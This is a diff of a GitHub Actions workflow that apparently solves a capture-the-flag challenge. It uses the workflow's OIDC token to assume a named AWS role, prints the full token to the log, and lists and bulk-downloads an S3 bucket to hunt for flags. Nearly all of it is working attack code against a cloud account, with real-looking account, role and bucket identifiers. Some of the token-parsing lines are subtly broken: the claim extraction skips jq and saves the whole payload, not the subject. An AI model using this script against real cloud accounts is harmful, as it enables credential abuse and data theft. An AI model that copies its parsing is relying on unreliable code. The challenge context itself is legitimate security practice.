@@ -1,26 +1,94 @@
-name: Debug OIDC Token
+name: Extract Complete Flag
 on:
   workflow_dispatch:
 permissions:
   id-token: write
   contents: read
 jobs:
-  debug:
+  retrieve:
     runs-on: ubuntu-latest
     steps:
-      - name: Get OIDC Token
-        id: get_token
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v2
+        with:
+          role-to-assume: arn:aws:iam::110678717447:role/AWSServicesRoleForGithub-jovb4kjb
+          aws-region: us-west-2
+      
+      - name: Extract OIDC Token
         run: |
-          echo "Getting OIDC token..."
-          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=aws" | jq -r '.value')
-          echo "OIDC_TOKEN=$OIDC_TOKEN" >> $GITHUB_ENV
+          echo "=== Extracting OIDC Token ==="
+          # This extracts the token that GitHub uses to authenticate to AWS
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=aws" | jq -r '.value')
           
-          # Split and decode the token parts
-          HEADER=$(echo $OIDC_TOKEN | cut -d. -f1 | base64 -d 2>/dev/null || echo $OIDC_TOKEN | cut -d. -f1 | base64 --decode 2>/dev/null)
-          PAYLOAD=$(echo $OIDC_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null || echo $OIDC_TOKEN | cut -d. -f2 | base64 --decode 2>/dev/null)
+          # Split token into parts
+          HEADER=$(echo $TOKEN | cut -d. -f1)
+          PAYLOAD=$(echo $TOKEN | cut -d. -f2)
           
-          echo "Token Header:"
-          echo "$HEADER" | jq
+          # Print full token in case it contains anything interesting
+          echo "Full token: $TOKEN"
           
-          echo "Token Payload (Claims):"
-          echo "$PAYLOAD" | jq
+          # Decode and print header
+          echo "=== Token Header ==="
+          echo $HEADER | base64 -d 2>/dev/null || echo $HEADER | base64 --decode 2>/dev/null | jq
+          
+          # Decode and print payload
+          echo "=== Token Claims ==="
+          echo $PAYLOAD | base64 -d 2>/dev/null || echo $PAYLOAD | base64 --decode 2>/dev/null | jq
+          
+          # Extract specific potentially important claims
+          SUB=$(echo $PAYLOAD | base64 -d 2>/dev/null || echo $PAYLOAD | base64 --decode 2>/dev/null | jq -r '.sub')
+          echo "Subject claim: $SUB"
+          
+          # Save for later reference
+          echo $SUB > subject_claim.txt
+      
+      - name: Check All S3 Bucket Contents
+        run: |
+          echo "=== Listing All Bucket Contents ==="
+          # List the entire bucket to find any potential files
+          aws s3 ls s3://codebackup-jovb4kjb/ --recursive
+          
+          # Try some specific paths based on the clues
+          echo "=== Checking Specific Paths ==="
+          aws s3 ls s3://codebackup-jovb4kjb/DRGN-EYE-443X/ || echo "No DRGN-EYE-443X path"
+          aws s3 ls s3://codebackup-jovb4kjb/backup/ || echo "No backup path"
+          aws s3 ls s3://codebackup-jovb4kjb/token/ || echo "No token path"
+          aws s3 ls s3://codebackup-jovb4kjb/claim/ || echo "No claim path"
+          aws s3 ls s3://codebackup-jovb4kjb/sub/ || echo "No sub path"
+          
+          # Try to find any flag-related files
+          echo "=== Searching for Flag Files ==="
+          aws s3 ls s3://codebackup-jovb4kjb/ --recursive | grep -i "flag\|ctf"
+      
+      - name: Download and Examine Second Flag
+        run: |
+          echo "=== Second Part of Flag ==="
+          aws s3 cp s3://codebackup-jovb4kjb/github/flag.txt .
+          cat flag.txt
+          
+          # Try to download any other potentially relevant files
+          mkdir -p all_files
+          aws s3 cp s3://codebackup-jovb4kjb/ all_files/ --recursive
+          
+          echo "=== Searching for CTF Flag Pattern in All Files ==="
+          grep -r "ctf{" all_files/ || echo "No explicit flag pattern found"
+          
+          # If there's a README.md, check it for clues
+          if [ -f all_files/README.md ]; then
+            echo "=== Contents of README.md ==="
+            cat all_files/README.md
+          fi
+      
+      - name: Try Direct Path to First Flag
+        run: |
+          echo "=== Attempting Direct Path to First Flag ==="
+          # Based on the hint about "extract", try to extract first part from subject claim
+          SUB=$(cat subject_claim.txt)
+          
+          # Extract repository name from subject claim
+          REPO=$(echo $SUB | cut -d: -f2)
+          
+          # Try various path combinations
+          aws s3 cp s3://codebackup-jovb4kjb/oidc/first_flag.txt . || echo "No file at oidc/first_flag.txt"
+          aws s3 cp s3://codebackup-jovb4kjb/extract/first_flag.txt . || echo "No file at extract/first_flag.txt"
+          aws s3 cp s3://codebackup-jovb4kjb/$REPO/first_flag.txt . || echo "No file at $REPO/first_flag.txt"
